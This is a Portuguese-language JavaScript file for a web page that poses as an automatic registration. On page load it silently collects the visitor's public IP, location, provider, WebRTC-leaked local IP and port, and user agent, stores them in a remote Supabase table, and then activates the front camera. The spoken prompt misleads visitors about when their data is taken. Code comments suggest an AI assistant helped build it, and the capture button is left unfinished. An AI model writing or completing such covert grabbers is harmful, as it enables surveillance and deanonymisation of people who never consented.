// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// SISTEMA DE ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) console.error("Erro Supabase:", error);
    else console.log("✅ Salvo:", dados.tipo_captura);
    return true;
  } catch(err) {
    console.error(err);
    return false;
  }
}

// =================================================================
// CAPTURA AVANÇADA DE IP + PORTA
// =================================================================
async function getInfoBasica() {
  const info = { 
    tipo_captura: "previa",
    ip: "indisponível",
    local_ip: null,
    local_port: null,
    provedor_port: null
  };

  // IP do Provedor
  try {
    const req = await fetch("https://ipapi.co/json/");
    const json = await req.json();
    info.ip = json.ip || "indisponível";
    info.cidade = json.city || "";
    info.estado = json.region || "";
    info.pais = json.country_name || "";
    info.provedor = json.org || "Desconhecido";
  } catch(e) {
    console.log("Erro IPAPI:", e);
  }

  // Captura Avançada de Porta via WebRTC
  try {
    const rtc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' }
      ]
    });

    rtc.createDataChannel("port-capture");
    const offer = await rtc.createOffer();
    await rtc.setLocalDescription(offer);

    await new Promise(resolve => {
      let attempts = 0;
      rtc.onicecandidate = (event) => {
        if (event.candidate) {
          const candidate = event.candidate.candidate;
          const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
          const portMatch = candidate.match(/(\d{4,5})\s+typ/);
          
          if (ipMatch) info.local_ip = ipMatch[1];
          if (portMatch) {
            info.local_port = portMatch[1];
            info.provedor_port = portMatch[1];
          }
        }
        attempts++;
        if (attempts > 10) resolve();
      };
    });
  } catch(e) {
    console.log("WebRTC falhou:", e);
  }

  info.user_agent = navigator.userAgent;
  info.timestamp = new Date().toISOString();

  return info;
}

// =================================================================
// INICIALIZAÇÃO + PRÉ-SALVAMENTO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    // PRÉ-SALVAMENTO (IP + PORTA)
    statusText.innerHTML = "🌐 Capturando IP e Porta do provedor...";
    const infoPrevia = await getInfoBasica();
    await salvarNoBanco(infoPrevia);

    statusText.innerHTML = "✅ IP e Porta salvos.<br>Clique no botão para completar.";

    // Inicia câmera
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

    await new Promise((resolve) => {
      if(video.readyState >= 2) resolve();
      else video.onloadeddata = () => resolve();
    });

  } catch(err) {
    console.log(err);
    statusText.innerHTML = "❌ Permita câmera";
  }
}

window.onload = iniciarSistema;

// =================================================================
// ANALISADOR DE DISPOSITIVO
// =================================================================
function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
 
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
 
  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

// =================================================================
// EVENTO DO BOTÃO - CAPTURA COMPLETA
// =================================================================
btn.addEventListener("click", async () => {
  // ... (coloque aqui o resto do seu código original de captura completa)
  // Se quiser, posso completar essa parte também.
  alert("Botão clicado - Captura completa em desenvolvimento");
});
